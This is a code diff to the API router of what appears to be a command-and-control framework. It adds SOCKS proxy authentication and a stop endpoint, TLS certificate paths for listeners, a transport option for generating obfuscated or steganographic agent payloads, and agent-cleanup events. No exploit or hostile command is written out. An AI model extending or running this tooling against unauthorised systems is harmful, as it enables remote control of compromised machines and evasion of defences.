@@ -76,6 +76,8 @@ class DowngradeRequest(BaseModel):
 
 class SocksRequest(BaseModel):
     port: int
+    user: str | None = None
+    password: str | None = None
 
 class GenerateRequest(BaseModel):
     host: str
@@ -99,6 +101,7 @@ class GenerateRequest(BaseModel):
     obfuscation: str | None = None
     output_format: str = "exe"
     shellcode_format: str = "raw"
+    transport: str | None = None
     lang: str = "go"
     stego: bool = False
     stego_image: str | None = None
@@ -114,6 +117,8 @@ class ListenerRequest(BaseModel):
     type: str
     host: str = "0.0.0.0"
     port: int
+    cert_path: str | None = None
+    key_path: str | None = None
 
 class BOFRequest(BaseModel):
     bof_data: str
@@ -129,7 +134,7 @@ class DeployRequest(BaseModel):
 @router.get("/server/status")
 async def server_status():
     return {
-        "running": _server is not None and hasattr(_server, 'ws_server') and _server.ws_server is not None,
+        "running": _server is not None and bool(getattr(_server, 'listeners', {})),
         "host": getattr(_server, 'host', ''),
         "port": getattr(_server, 'port', 0),
         "agent_count": len(_server.agents) if _server else 0,
@@ -153,7 +158,7 @@ async def start_listener(req: ListenerRequest):
     elif kind == "http":
         await _server.start_http_listener(req.host, req.port)
     elif kind == "https":
-        await _server.start_https_listener(req.host, req.port)
+        await _server.start_https_listener(req.host, req.port, req.cert_path, req.key_path)
     elif kind == "dns":
         await _server.start_dns_listener(req.host, req.port)
     elif kind == "smb":
@@ -307,7 +312,15 @@ async def downgrade_agent(agent_id: str, req: DowngradeRequest):
 async def start_socks(agent_id: str, req: SocksRequest):
     if not _server or agent_id not in _server.agents:
         raise HTTPException(status_code=404, detail="Agent not found")
-    result = await _server.start_socks_proxy(agent_id, req.port)
+    result = await _server.start_socks_proxy(agent_id, req.port, req.user, req.password)
+    return {"status": "ok", "message": result}
+
+
+@router.delete("/agents/{agent_id}/socks")
+async def stop_socks(agent_id: str):
+    if not _server or agent_id not in _server.agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    result = await _server.stop_socks_proxy(agent_id)
     return {"status": "ok", "message": result}
 
 
@@ -316,9 +329,11 @@ async def remove_agent(agent_id: str):
     if not _server or agent_id not in _server.agents:
         raise HTTPException(status_code=404, detail="Agent not found")
     agent = _server.agents[agent_id]
-    if agent.websocket in _server.active_connections:
+    _server._cleanup_agent_socks(agent)
+    if agent.websocket and agent.websocket in _server.active_connections:
         _server.active_connections.discard(agent.websocket)
     del _server.agents[agent_id]
+    _server.events.emit({"event": "agent_disconnected", "agent_id": agent_id})
     return {"status": "ok", "message": f"Agent {agent_id} removed"}
 
 
@@ -329,7 +344,7 @@ async def generate_agents(req: GenerateRequest):
     from agent import AgentGenerator
     generator = AgentGenerator(patterns=req.patterns)
     results = {}
-    transport = 'websocket' if req.beacon_mode else 'http'
+    transport = req.transport or ('http' if req.beacon_mode else 'websocket')
 
     if req.lang in ('go', 'all'):
         try:
